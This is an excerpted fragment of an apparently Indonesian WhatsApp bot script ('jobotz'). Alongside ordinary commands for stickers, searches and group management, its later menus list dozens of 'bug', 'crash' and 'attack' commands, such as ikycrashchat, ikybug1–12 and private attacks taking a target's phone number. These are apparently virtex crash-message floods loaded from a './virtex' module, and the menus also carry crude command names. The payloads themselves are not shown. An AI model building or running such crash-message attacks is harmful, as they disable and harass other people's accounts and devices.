...
const { buttoniky } = require('./virtex/buttoniky')
...
jobotz.readMessages([m.key])
    ...
    //console.log(nomerOwner)
        ...
        const isOwner = [botNumber, ...global.owner].map(jid => jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(itulho)
...
var sticWait = (hehe) => {
ano = fs.readFileSync('./src/ikymaker.webp')
jobotz.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
...
break
          ...
          m.reply(`Exif berhasil diubah menjadi\n\n│  ݊⃟̥⃝̇݊⃟╾ Packname : ${global.packname}\n│  ݊⃟̥⃝̇݊⃟╾ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		...
		m.reply('Sukses Broadcast')
            ...
            case 'infochat': {
                ...
                for (let i of msg.userReceipt) {
                    ...
                    teks += `│  ݊⃟̥⃝̇݊⃟╾ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━│  ݊⃟̥⃝̇݊⃟╾ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │  ݊⃟̥⃝̇݊⃟╾ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
	    ...
	    break
            case 'listpc': {
             ...
             case 'listonline': case 'liston': {
                    ...
                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│  ݊⃟̥⃝̇݊⃟╾ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
...
╰━═════════════━•`,
		...
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
	        ...
	        if (!isCreator && !isBan) return
                ...
                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│  ݊⃟̥⃝̇݊⃟╾ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
		...
		if (anu.type == 'video') {
			...
			caption: `
│  ݊⃟̥⃝̇݊⃟╾ Title : ${anu.title}
│  ݊⃟̥⃝̇݊⃟╾ Author : ${anu.author.name}
│  ݊⃟̥⃝̇݊⃟╾ Like : ${anu.like}
│  ݊⃟̥⃝̇݊⃟╾ Caption : ${anu.caption}
│  ݊⃟̥⃝̇݊⃟╾ Url : ${anu.media[0]}
...
`,
		    ...
		    anu.media.map(async (url) => {
		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│  ݊⃟̥⃝̇݊⃟╾ Title : ${anu.title}\n│  ݊⃟̥⃝̇݊⃟╾ Author : ${anu.author.name}\n│  ݊⃟̥⃝̇݊⃟╾ Like : ${anu.like}\n│  ݊⃟̥⃝̇݊⃟╾ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
...
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
        ...
        if (stderr.trim()) m.reply(stderr)
            ...
            let teks = `│  ݊⃟̥⃝̇݊⃟╾ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `│  ݊⃟̥⃝̇݊⃟╾ Name : ${i.name}\n`
            teks += `│  ݊⃟̥⃝̇݊⃟╾ Link : ${i.link}\n`
            teks += `│  ݊⃟̥⃝̇݊⃟╾ Developer : ${i.developer}\n`
            teks += `│  ݊⃟̥⃝̇݊⃟╾ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
...
let capt = `│  ݊⃟̥⃝̇݊⃟╾ Title: ${judul}
│  ݊⃟̥⃝̇݊⃟╾ Realease: ${rilis}
│  ݊⃟̥⃝̇݊⃟╾ Size: ${ukuran}
│  ݊⃟̥⃝̇݊⃟╾ Type: ${type}
│  ݊⃟̥⃝̇݊⃟╾ Storage: ${storage}
│  ݊⃟̥⃝̇݊⃟╾ Display: ${display}
│  ݊⃟̥⃝̇݊⃟╾ Inchi: ${inchi}
│  ݊⃟̥⃝̇݊⃟╾ Pixel: ${pixel}
│  ݊⃟̥⃝̇݊⃟╾ Video Pixel: ${videoPixel}
│  ݊⃟̥⃝̇݊⃟╾ Ram: ${ram}
│  ݊⃟̥⃝̇݊⃟╾ Chipset: ${chipset}
│  ݊⃟̥⃝̇݊⃟╾ Battery: ${batrai}
│  ݊⃟̥⃝̇݊⃟╾ Battery Brand: ${merek_batre}
│  ݊⃟̥⃝̇݊⃟╾ Detail: ${detail}`
            ...
            for (let i of res.result){
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Title: ${i.title}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Thumbnail: ${i.thumb}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Url: ${i.url}\n\n──────────────────────\n`
            }
            ...
            for (let i of res.result){
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Community: ${i.community}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Community Link: ${i.community_link}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Thumbnail: ${i.community_thumb}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Description: ${i.community_desc}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            ...
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Judul: ${judul}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Dibaca: ${dibaca}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Divote: ${divote}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Bab: ${bab}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Waktu: ${waktu}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Url: ${url}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Deskripsi: ${description}`
            jobotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            ...
            for (let i of res.result) {
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Judul: ${i.judul}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Like: ${i.like}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Creator: ${i.creator}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Genre: ${i.genre}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            ...
            for (let i of res.result) {
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Judul: ${i.judul}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Years: ${i.years}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Genre: ${i.genre}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Url: ${i.url}\n`
            capt += `│  ݊⃟̥⃝̇݊⃟╾ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
...
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
╰─────────────────╮
╭─────────────────╯
│ 〘WEBZONE MENU〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}�
���
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
╰─────────────────╮
╭─────────────────╯
│〘 DATABASE MENU 〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
╰─────────────────╮
╭─────────────────╯
│〘ANONYMOUS MENU〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚗𝚎𝚡𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
╰─────────────────╮
╭─────────────────╯
│  〘 ISLAMIC MENU 〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚒𝚚𝚛𝚊
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
╰─────────────────╮
╭─────────────────╯
│  〘 VOICE MENU 〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚋𝚊𝚜𝚜
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚍𝚎𝚎𝚙
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚏𝚊𝚜𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚏𝚊𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚕𝚘𝚠
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
╰─────────────────╮
╭─────────────────╯
│ 〘 OWNER MENU 〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
╰─────────────────╮
╭─────────────────╯
│    〘 THANKS TO 〙
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ akatsuki for unity
│  ݊⃟̥⃝̇݊⃟╾ zZz - x - team
│  ݊⃟̥⃝̇݊⃟╾ and my friends❤ 
╰─────────────────╯
...
break
 case 'bugiky': { 
 if (!isCreator && !isBan && !isOwner) return
...
╭─────────────────╮
│     ⸸‎〘 BUG IKY 〙⸸‎
│© Hyy Kak ${pushname} Selamat ${salam}🔥
...
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}poll
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}polliky
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}polvot
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}bokep
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikysantet
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikydocnopayment
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyinfinite
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycrashchat
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymakerzcrash
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycrashnopayment
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycrashpakepayment
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikynomercy
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyselebew
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycrashemoji
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycrashtitik
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikythemonster
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug1 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug2 (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug3 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug4 (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug5 (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug6 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug7 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug8 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug9 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug10 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug11 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybug12 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyness (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikydarkness (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ngentids (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymakerztravazap (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymakerzcrashhuhu (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygans (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}kintil (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}peler (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}itzmeiky (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}pelerpakepayment (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikypay (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytroli (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}kontol (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}kuntul (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikydocu (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyhello (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}virkon (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikylokas (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}monyet (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymomo (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuggam (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugpc (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugvn (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytroliv2 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytroliv3 (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyliveloc (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuglist (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytagcrash (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycatalog (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugstik (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}crashiky (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybutton (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugloc (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugdoc (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikylivelocv2 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuginvite (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugstikv2 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikycatalogv2 (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugbutton (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuttonygy (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytengkorak (jumlah)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyandroid (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymakerzcrashv2 (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyartcrash (jumlah) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}tengkorak [unlimited]
╰─────────────────╮
╭─────────────────╯
│ ◪〘 MENU ATTACK1 〙◪
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyvnprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikythebadboyprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikykintilprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuttoprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikystikprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytroliprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikykontolprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikykuntulprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyhelloprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikysantetprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikymomoprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuglocprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyinfiniteprivate (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuttonprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikylivelocprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybugdocprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikybuginviteprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikytengkorakprivate (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug1 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug2 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug3 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug4 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug5 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug6 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug7 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug8 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug9 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug10 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug11 (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikyprivatebug12 (Nomer) 
╰─────────────────╮
╭─────────────────╯
│ ◪〘 MENU ATTACK2 〙◪
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenvn (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenstik (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskentroli (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenkintil (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenhello (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenkontol (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenkuntul (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenmomo (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskensantet (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskeninfinite (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenliveloc (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbutton (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbugloc (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskentengkorak (Nomer) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug1 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug2 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug3 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug4 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug5 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug6 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug7 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug8 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug9 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug10 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug11 (Nomer)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}ikygaskenbug12 (Nomer)
╰─────────────────╯
╰─────────────────╮
╭─────────────────╯
│ ◪〘 JADI BUG MENU 〙◪
╰─────────────────╮
╭─────────────────╯
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}polling (teks)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadilokas (teks/reply)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadibugdoc (send/replyMedia)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadibugbutton (teks)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jaditroli (teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadipeler (teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadimonyet (teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}kybugstik (reply image)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadibugvn (reply audio) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadivirkon (teks/reply teks)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadiikyness (reply media) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadingentids (reply media) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadidarkness (reply media)
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadikintil (teks/reply teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadikuntul (teks/reply teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadikontol (teks/reply teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadibugloc (teks/reply teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadiliveloc (teks/reply teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadicatalog (reply media + teks) 
│  ݊⃟̥⃝̇݊⃟╾ ${prefix}jadibuttonimg (reply media + teks)
